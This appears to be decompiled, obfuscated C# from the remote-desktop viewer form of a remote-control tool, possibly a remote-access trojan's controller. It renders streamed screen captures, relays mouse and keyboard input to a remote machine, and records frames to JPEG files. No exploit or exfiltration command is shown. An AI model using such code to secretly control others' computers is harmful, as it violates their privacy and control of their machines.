      stream_0.Read(buffer1, 0, 4);
      int int32_2 = BitConverter.ToInt32(buffer1, 0);
      stream_0.Read(buffer1, 0, 4);
      buffer1 = new byte[BitConverter.ToInt32(buffer1, 0) - 1 + 1];
      stream_0.Read(buffer1, 0, buffer1.Length);
      using (Bitmap bitmap = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer1)))
      {
        using (Graphics graphics = Graphics.FromImage((Image) this.bitmap_0))
        {
          graphics.DrawImage((Image) bitmap, new Point(int32_1, int32_2));
          rectangleList.Add(new Rectangle(int32_1, int32_2, bitmap.Width, bitmap.Height));
        }
      }
    }
    rectangle_1 = rectangleList.ToArray();
    this.rectangle_0 = rectangle_1;
    stream_0.Dispose();
    return this.bitmap_0;
  }

  private void method_20(object sender, EventArgs e)
  {
    this.method_5();
    this.bool_6 = true;
    new Thread(new ThreadStart(this.method_18)).Start();
    this.vmethod_12().Enabled = false;
    this.vmethod_14().Enabled = true;
    this.vmethod_18().Enabled = true;
  }

  private void method_21(object sender, EventArgs e)
  {
    this.bool_6 = false;
    this.method_6();
    this.Text = string.Format("{0}/{1} - Remote Desktop", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.vmethod_12().Enabled = true;
    this.vmethod_14().Enabled = false;
    this.vmethod_18().Enabled = false;
    this.vmethod_34().BackgroundImage = (Image) null;
  }

  private void method_22(object sender, EventArgs e)
  {
    if (this.vmethod_28().Checked)
      this.vmethod_28().Checked = false;
    else
      this.vmethod_28().Checked = true;
  }

  private void method_23(object sender, EventArgs e)
  {
    if (this.vmethod_26().Checked)
    {
      this.vmethod_26().Checked = false;
      this.bool_2 = false;
    }
    else
    {
      this.vmethod_26().Checked = true;
      this.bool_2 = true;
    }
  }

  private void method_24(object sender, EventArgs e)
  {
    if (this.vmethod_32().Checked)
    {
      this.bool_3 = false;
      this.vmethod_32().Checked = false;
    }
    else
    {
      this.bool_3 = true;
      this.vmethod_32().Checked = true;
    }
  }

  private void method_25(object sender, EventArgs e)
  {
    if (!this.bool_5)
    {
      this.size_0 = this.Size;
      this.FormBorderStyle = FormBorderStyle.None;
      this.WindowState = FormWindowState.Maximized;
      this.bool_5 = true;
    }
    else
    {
      this.FormBorderStyle = FormBorderStyle.Sizable;
      this.WindowState = FormWindowState.Normal;
      this.Size = this.size_0;
      this.bool_5 = false;
    }
  }

  private void method_26(
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket mouseButtonPacket_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket mouseActionPacket_0,
    int int_3,
    int int_4,
    int int_5,
    int int_6)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[7]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.MouseInput,
      (object) mouseButtonPacket_0,
      (object) mouseActionPacket_0,
      (object) int_3,
      (object) int_4,
      (object) int_5,
      (object) int_6
    });
  }

  private void method_27(
    int int_3,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket mouseActionPacket_0)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.KeyboardInput,
      (object) mouseActionPacket_0,
      (object) int_3
    });
  }

  private void method_28(object sender, MouseEventArgs e)
  {
    if (!this.bool_2)
      return;
    switch (e.Button)
    {
      case MouseButtons.Left:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Left, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
      case MouseButtons.Right:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Right, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
      case MouseButtons.Middle:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Middle, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
    }
  }

  private void method_29(object sender, MouseEventArgs e)
  {
    if (!this.bool_2)
      return;
    switch (e.Button)
    {
      case MouseButtons.Left:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Left, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Up, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
      case MouseButtons.Right:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Right, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Up, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
      case MouseButtons.Middle:
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Middle, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Up, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
        break;
    }
  }

  private void method_30(object sender, MouseEventArgs e)
  {
    if (!(this.bool_2 & !this.vmethod_12().Enabled & this.vmethod_28().Checked))
      return;
    if (this.gclass18_0.method_20().int_2 < 60)
    {
      if (!this.bool_2)
        return;
      this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Hover, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
    }
    else
    {
      if (this.stopwatch_0.ElapsedMilliseconds <= 100L)
        return;
      if (this.bool_2)
        this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Hover, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down, e.X, e.Y, this.vmethod_34().ClientRectangle.Size.Width, this.vmethod_34().ClientRectangle.Size.Height);
      this.stopwatch_0 = Stopwatch.StartNew();
    }
  }

  private void method_31(object sender, MouseEventArgs e)
  {
    if (!this.bool_2)
      return;
    if (e.Delta > 0)
      this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Scroll, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.ScrollUp, 0, 0, 0, 0);
    else
      this.method_26(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseButtonPacket.Scroll, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.ScrollDown, 0, 0, 0, 0);
  }

  private void FormDesktop_KeyDown(object sender, KeyEventArgs e)
  {
    if (!this.bool_3)
      return;
    this.method_27((int) e.KeyCode, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Down);
  }

  private void FormDesktop_KeyUp(object sender, KeyEventArgs e)
  {
    if (!this.bool_3)
      return;
    this.method_27((int) e.KeyCode, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MouseActionPacket.Up);
  }

  private void method_32()
  {
    this.stopwatch_1 = new Stopwatch();
    while (this.bool_4)
    {
      if (this.image_0 != null)
      {
        ++this.int_2;
        string filename = this.string_1 + "\\" + Conversions.ToString(this.int_2) + ".jpg";
        this.stopwatch_1.Start();
        this.image_0.Save(filename, ImageFormat.Jpeg);
        this.stopwatch_1.Stop();
      }
      Thread.Sleep((int) Math.Round(200.0 / 3.0 - (double) this.stopwatch_1.ElapsedMilliseconds));
      this.stopwatch_1.Reset();
    }
  }

  private void method_33(object sender, EventArgs e)
  {
    if (this.vmethod_18().Checked)
    {
      this.vmethod_18().Checked = false;
      this.vmethod_18().Image = (Image) Class145.smethod_4();
      this.bool_4 = false;
      new FormEncode(this.int_2, this.string_1).Show();
      this.int_2 = 0;
    }
    else
    {
      this.vmethod_18().Checked = true;
      this.vmethod_18().Image = (Image) Class145.smethod_3();
      this.bool_4 = true;
      new Thread(new ThreadStart(this.method_32)).Start();
    }
  }

  private void FormDesktop_FormClosing(object sender, FormClosingEventArgs e)
  {
    this.method_6();
    this.bool_6 = false;
    if (!this.vmethod_18().Checked)
      return;
    this.vmethod_18().Image = (Image) Class145.smethod_4();
    this.bool_4 = false;
    new FormEncode(this.int_2, this.string_1).Show();
    this.int_2 = 0;
  }

  internal sealed class Class82
  {
    public int int_0;
    public FormDesktop formDesktop_0;

    internal sealed class Class83
    {
      public Image image_0;
      public FormDesktop.Class82 class82_0;

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__55() => this.class82_0.formDesktop_0.method_13((Bitmap) this.image_0, this.class82_0.int_0);
    }
  }
}
